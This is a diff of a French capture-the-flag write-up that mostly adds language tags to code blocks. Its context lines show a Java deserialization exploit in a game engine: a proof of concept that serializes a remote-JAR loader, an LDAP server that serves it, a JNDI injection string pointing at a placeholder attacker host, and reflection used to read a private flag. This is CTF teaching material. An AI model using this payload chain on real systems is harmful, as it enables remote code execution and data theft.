@@ -112,7 +112,7 @@ désérialisation arbitraire permet "souvent" de déclencher du chargement
 de code distant.
 
 Examinons le code du moteur de jeu avec jadx:
-```
+```java
 public class JarPluginContainer extends PluginContainer {
     private final URL url;
     private boolean loaded;
@@ -145,7 +145,7 @@ On voit qu'en désérialisant un JarPluginContainer avec loaded=true, on
 peut déclencher le chargement d'un JAR distant.
 
 On prépare l'objet sérialisé:
-```
+```java
 $ cat poc.java
 import java.net.URL;
 import java.io.ObjectOutputStream;
@@ -163,6 +163,9 @@ public class Main {
         oo.writeObject(o);
     }
 }
+```
+
+```
 $ java -cp game-0.31.9-all.jar poc.java 2>blob.ser
 $ xxd blob.ser
 00000000: aced 0005 7372 0035 6f72 672e 6861 6c6c  ....sr.5org.hall
@@ -177,7 +180,7 @@ $ xxd blob.ser
 
 Il faut ensuite le servir dans un serveur LDAP. On peut utiliser
 le module Python ldapserver:
-```
+```python
 import logging
 import socketserver
 
@@ -198,6 +201,7 @@ JAVA_OBJECTS = """
   DESC 'Java object representation'
 ...
 )
+"""
 
 def split(s):
     items = s.strip().split("\n\n")
@@ -240,7 +244,7 @@ connaît le flag (qu'il ne veut pas nous donner), et le plus simple
 serait d'avoir le fichier plugin correspondant.
 
 Commençons par trouver ces fichiers, en modifiant le plugin example:
-```
+```java
 public class ExamplePlugin implements Plugin {
 
     private static ExamplePlugin instance;
@@ -292,7 +296,7 @@ ${jndi:ldap://ww.xx.yy.zz:3890/dc=example,dc=com}
 
 On peut donc aller plus loin et obtenir un dump en Base64 du fichier de
 plugin qui nous intéresse:
-```
+```java
     @Override
     public void onLoad(Game game, PluginMetadata metadata, Logger logger) {
         ...
@@ -323,7 +327,7 @@ On obtient le fichier de 7982 octets plugin-npcs-1.0.0.jar
 
 On peut examiner plugin-npcs-1.0.0.jar avec JADX pour comprendre ce qui
 se passe:
-```
+```java
 public class FlagAI implements ConversationAI {
     private static final String FLAG;
     private boolean hasMore = true;
@@ -343,7 +347,7 @@ Le FLAG est stocké dans un membre privé de la classe FlagAI, et de toute
 façon, aucune méthode ne le renvoie. Il faut donc y accéder _de force_.
 La _réflexion_ Java permet d'accéder aux champs privés.
 
-```
+```java
 import java.lang.reflect.Field;
 import org.hallebarde.npcsplugin.FlagAI;
 
